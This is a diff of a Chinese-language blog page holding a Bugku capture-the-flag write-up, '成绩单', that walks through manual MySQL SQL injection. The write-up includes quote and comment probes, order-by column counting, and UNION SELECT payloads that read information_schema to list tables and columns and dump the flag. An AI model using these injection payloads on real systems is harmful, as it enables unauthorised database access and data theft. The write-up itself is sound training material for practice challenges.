@@ -220,7 +220,7 @@
             <h1 style="display: none">bugku20.09.05</h1>
             
             <div class="markdown-body" id="post-body">
-              <p>又是一脸懵逼的一天。。</p>
+              <p>又是一脸懵逼的一天。。<br><a id="more"></a></p>
 <hr>
 <p>成绩单<br><img src="/2020/09/05/bugku%E6%88%90%E7%BB%A9%E5%8D%95/%E6%89%B9%E6%B3%A8%202020-09-05%20134633.jpg?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"><br>进去啥也没发现，查看源码没什么收获，看到表单自然就想着SQL注入。<br>正常的输入数字1、2、3都得到结果，尝试1’错误，再试1’—没用，加空格（1’— ）或者1’#正常返回，应该是MYSQL数据库。再尝试数字注入1+1结果返回结果和1一样，应该不是    按数字格式处理。<br>最后尝试注入查询结构。看查询返回的界面应该是有4列（姓名以及三门分数），尝试1’ order by 4#返回正常，再试1’ order by 5#没有返回，应该是四列。<br>最后用UNION联合注入，1’ union select null,null,null,null#依然只返回一行，重置union前面的查询，用’ union select 1,2,3,4#有返回。<br><img src="/2020/09/05/bugku%E6%88%90%E7%BB%A9%E5%8D%95/%E6%89%B9%E6%B3%A8%202020-09-05%20135806.jpg?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"><br>开始注入查询：<br><code>&#39; union select null,null,null,group_concat(table_name) from information_schema.tables where table_schema=database()#</code><br>得到两个table_name: fl4g,sc<br> <code>&#39; union select null,null,null,group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39;#</code><br> 得到列名skctf_flag<br> <code>&#39; union select null,null,null,skctf_flag from fl4g#</code><br> 得到flag</p>
 <hr>
